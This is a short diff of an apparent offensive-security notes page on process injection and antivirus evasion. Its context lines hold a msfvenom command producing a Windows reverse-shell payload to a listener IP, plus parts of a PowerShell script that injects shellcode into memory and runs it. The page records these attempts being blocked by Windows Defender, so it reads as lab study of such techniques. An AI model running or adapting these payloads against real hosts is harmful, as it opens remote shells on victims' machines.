@@ -41,12 +41,13 @@ Use `OpenProcess` function to obtain a valid `HANDLE5` to a target process that 
   ![](/assets/Project/Invoke.png)
 
 2. ScareCrow (Caught by Window Defender) https://github.com/optiv/ScareCrow 
-
-
+  ![](/assets/Project/scare.png)
+  ![](/assets/Project/One.png)
 3. Powershell Remote Process memory Injection (Caught by Windows Defender)
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
 ```
+
 ```bash
 $code = '
 [DllImport("kernel32.dll")]
@@ -75,6 +76,8 @@ for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i
 $winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
 
 ```
+
+
 This was also blocked by Windows Defender.
 ## Weaponization
 
